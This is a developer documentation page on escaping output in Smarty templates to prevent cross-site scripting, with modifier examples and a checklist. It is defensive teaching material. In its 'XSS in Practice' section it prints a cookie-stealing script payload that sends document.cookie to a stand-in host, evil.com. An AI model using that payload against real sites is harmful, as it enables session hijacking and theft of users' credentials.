## Securing (Escaping) Output

Escaping output means converting special characters in data into safe representations before displaying them in HTML, JavaScript, or other contexts. This prevents Cross-Site Scripting (XSS) attacks, where an attacker injects malicious code that executes in other users' browsers.

### The Rule

**Escape late.** Store data in its raw form in the database. Escape it at the point of output — in your Smarty templates — not when saving.

### XSS in Practice

Suppose a user submits a holiday name containing JavaScript:

```
&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;
```

If your template outputs this value without escaping:

```html
&lt;td&gt;{$holiday->name}&lt;/td&gt;
```

The script will execute in every admin's browser who views the list. With escaping, the output is rendered as harmless text instead.

### Escaping in Smarty Templates

#### The escape modifier

Smarty provides the `escape` modifier for HTML context:

```html
&lt;!-- Escape for HTML output --&gt;
&lt;td&gt;{$holiday->name|escape}&lt;/td&gt;
&lt;td&gt;{$holiday->description|escape}&lt;/td&gt;

&lt;!-- In an attribute --&gt;
&lt;input type="text" name="{$actionid}name" value="{$holiday->name|escape}" /&gt;

&lt;!-- In a link title --&gt;
&lt;a href="{$edit_url}" title="{$holiday->name|escape}"&gt;Edit&lt;/a&gt;
```

The `escape` modifier with no arguments defaults to HTML escaping — converting `<`, `>`, `&`, `"`, and `'` to their HTML entity equivalents.

#### Different escape contexts

```html
&lt;!-- HTML (default) --&gt;
{$value|escape}
{$value|escape:'html'}

&lt;!-- URL encoding --&gt;
&lt;a href="page.php?name={$value|escape:'url'}"&gt;

&lt;!-- JavaScript string --&gt;
&lt;script&gt;var name = '{$value|escape:'javascript'}';&lt;/script&gt;

&lt;!-- HTML entity encoding (numeric) --&gt;
{$value|escape:'htmlall'}
```

### When to Escape

| Context | Escape method | Example |
| --- | --- | --- |
| HTML body text | `{$var|escape}` | `<p>{$name|escape}</p>` |
| HTML attribute | `{$var|escape}` | `<input value="{$name|escape}" />` |
| URL parameter | `{$var|escape:'url'}` | `href="?q={$term|escape:'url'}"` |
| JavaScript string | `{$var|escape:'javascript'}` | `var x = '{$name|escape:'javascript'}';` |

### When NOT to Escape

There are cases where you intentionally output raw HTML:

- **WYSIWYG content** — fields edited with a WYSIWYG editor (via `{cms_textarea}`) contain intentional HTML. Display these without escaping, but sanitize them on input instead (see [Securing Input](/modules/security/securing-input/)).
- **Module-generated HTML** — HTML built by your own code (e.g., pagination links) does not need escaping since you control the content.

### Escaping in PHP

If you need to escape values in your action files (rare — prefer escaping in templates):

```
// HTML escaping
$safe = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');

// URL encoding
$safe = urlencode($value);
```

### The strip\_tags Modifier

To remove HTML tags entirely (e.g., for search indexing or plain-text summaries):

```
&lt;!-- In Smarty --&gt;
{$holiday->description|strip_tags}

&lt;!-- In Smarty with summarize --&gt;
{$holiday->description|strip_tags|summarize}
```
```
// In PHP
$plain = strip_tags($holiday->description);
```

### Checklist

- Escape all user-supplied data in templates with `{$var|escape}`.
- Use the correct escape context (HTML, URL, JavaScript).
- Escape data in HTML attributes, not just body text.
- Do not escape WYSIWYG content on output — sanitize it on input instead.
- Store raw data in the database; escape at the point of display.

### Next Steps

Continue to [Securing (Sanitizing) Input](/modules/security/securing-input/) to learn how to clean data before storing or processing it.
